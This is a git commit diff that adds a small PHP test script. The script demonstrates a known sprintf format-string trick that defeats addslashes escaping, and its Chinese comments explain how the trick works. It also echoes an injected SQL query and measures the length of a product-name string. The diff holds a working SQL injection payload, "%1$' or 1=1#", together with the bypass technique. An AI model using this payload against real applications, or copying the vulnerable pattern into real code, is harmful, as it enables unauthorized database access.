3de8dbed481cebf0064f3c60f858d92ccac7a9c9
yong <yong@blueoceanpay.com>
2021-05-14 17:06:12 +0800

    sql替换-合并三个
    php - sprintf 漏洞
    
    检查字符串长度

--- test_merge/test.php
+++ test_merge/test.php
@@ -9,3 +9,22 @@ $string = '{
 }';
 
 $string = json_decode($string, true);
+
+$input = addslashes ("%1$' or 1=1#" );
+$b = sprintf ("AND b='%s'", $input );
+$sql = sprintf ("SELECT * FROM t WHERE a='%s' $b ", 'admin' );
+//对$input与$b进行了拼接
+//$sql = sprintf ("SELECT * FROM t WHERE a='%s' AND b='%1$\' and 1=1#' ", 'admin' );
+//很明显，这个句子里面的\是由addsashes为了转义单引号而加上的，使用%s与%1$\类匹配admin，那么admin只会出现在%s里，%1$\为空
+echo  $sql ;
+
+$sql="select * from user where username='%\' or 1=1 #';";
+$user='admin';
+echo sprintf($sql,$user);
+
+
+
+$sting = "MAAC10 NMN 真正煙酰胺單核苷酸補充劑 (NMN 125 毫克膠囊)";
+
+echo '=========';
+ print_r(strlen($sting));
